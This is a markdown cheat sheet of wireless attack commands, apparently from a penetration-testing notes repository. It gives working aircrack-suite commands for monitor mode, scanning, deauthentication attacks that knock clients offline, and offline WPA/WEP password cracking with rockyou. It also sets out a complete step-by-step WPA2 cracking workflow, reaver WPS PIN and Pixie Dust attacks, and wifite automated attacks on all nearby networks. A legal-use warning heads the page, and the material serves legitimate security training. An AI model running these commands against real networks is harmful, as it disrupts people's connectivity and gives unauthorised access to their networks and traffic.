# 📡 Wireless Commands

> ⚠️ **Only test wireless networks you own or have written permission to test.**  
> Unauthorized wireless testing is illegal in most countries.

---

## 🔧 Setup — Enable Monitor Mode

```bash
# Check your wireless interface name
iwconfig
ip link show

# Put interface in monitor mode
sudo airmon-ng start wlan0        # Start monitor mode (creates wlan0mon)
sudo airmon-ng stop wlan0mon      # Stop monitor mode

# Kill interfering processes first
sudo airmon-ng check kill

# Alternative using iw
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

---

## 📶 `airodump-ng` — Scan for Wi-Fi Networks

```bash
# Scan all networks
sudo airodump-ng wlan0mon

# Scan only 2.4GHz
sudo airodump-ng --band bg wlan0mon

# Scan only 5GHz
sudo airodump-ng --band a wlan0mon

# Target a specific network and capture handshake
sudo airodump-ng -c <channel> --bssid <target-MAC> -w capture wlan0mon
```

**Output columns explained:**
```
BSSID    = MAC address of the access point
PWR      = Signal strength (higher = closer)
CH       = Channel number
ENC      = Encryption type (WPA2, WPA, WEP, OPN)
ESSID    = Network name (SSID)
STATION  = Connected client MAC addresses
```

---

## 💥 `aireplay-ng` — Deauth Attack (Capture Handshake)

```bash
# Send deauth packets to force client reconnect (captures WPA handshake)
sudo aireplay-ng --deauth 10 -a <AP-MAC> -c <client-MAC> wlan0mon

# Deauth all clients from AP
sudo aireplay-ng --deauth 10 -a <AP-MAC> wlan0mon
```

**Why:** When a client reconnects, it sends a WPA handshake that can be captured and cracked offline.

---

## 🔓 `aircrack-ng` — Crack Wi-Fi Passwords

```bash
# Crack WPA/WPA2 with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture*.cap

# Crack WEP
aircrack-ng capture*.cap

# Test against a specific wordlist
aircrack-ng -w <wordlist> <capture-file>.cap
```

---

## 🎯 Complete WPA2 Cracking Workflow

```bash
# Step 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Find your target network
sudo airodump-ng wlan0mon
# Note down: BSSID (MAC), Channel, ESSID

# Step 3: Target the network and capture traffic
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Step 4: (New terminal) Send deauth to speed up handshake capture
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
# Watch for "WPA handshake: XX:XX:XX:XX:XX:XX" in airodump-ng window

# Step 5: Crack the handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture*.cap
```

---

## 📡 `iwlist` / `iw` — Wi-Fi Scanning

```bash
# Scan for nearby networks
sudo iwlist wlan0 scan
sudo iwlist wlan0 scan | grep -E "ESSID|Address|Signal"

# Modern alternative
iw dev wlan0 scan
iw dev wlan0 scan | grep -E "SSID|signal|addr"
```

---

## 🤖 `wash` — Find WPS-Enabled Networks

```bash
sudo wash -i wlan0mon             # Find networks with WPS enabled
```

---

## 🔨 `reaver` — WPS PIN Attack

```bash
sudo reaver -i wlan0mon -b <BSSID> -vv    # Attack WPS PIN
sudo reaver -i wlan0mon -b <BSSID> -vv -K 1  # Pixie Dust attack (faster)
```

**Note:** Most modern routers have WPS locked/disabled. This is less effective today.

---

## 🛡️ `wifite` — Automated Wireless Attack Tool

```bash
sudo wifite                       # Auto attack all nearby networks (lab only)
sudo wifite --wpa                 # Target only WPA networks
sudo wifite -e <ESSID>            # Target specific network name
```

**Use:** Automates the entire process (monitor mode → capture → crack) — great for learning.

---

## 🔍 `kismet` — Wireless Network Detector

```bash
sudo kismet                       # Start Kismet (web UI on port 2501)
# Access via browser: http://localhost:2501
```

**Use:** Advanced wireless detection, works passively without sending any packets.

---

## 🧪 Tools Summary

| Tool | Use |
|------|-----|
| `airmon-ng` | Enable/disable monitor mode |
| `airodump-ng` | Capture packets and scan networks |
| `aireplay-ng` | Inject packets (deauth attack) |
| `aircrack-ng` | Crack WEP/WPA passwords |
| `reaver` | WPS PIN brute force |
| `wifite` | Automated wireless attacks |
| `kismet` | Passive wireless detection |
| `wash` | Find WPS-enabled networks |

---

*← Back to [Main README](../README.md)*
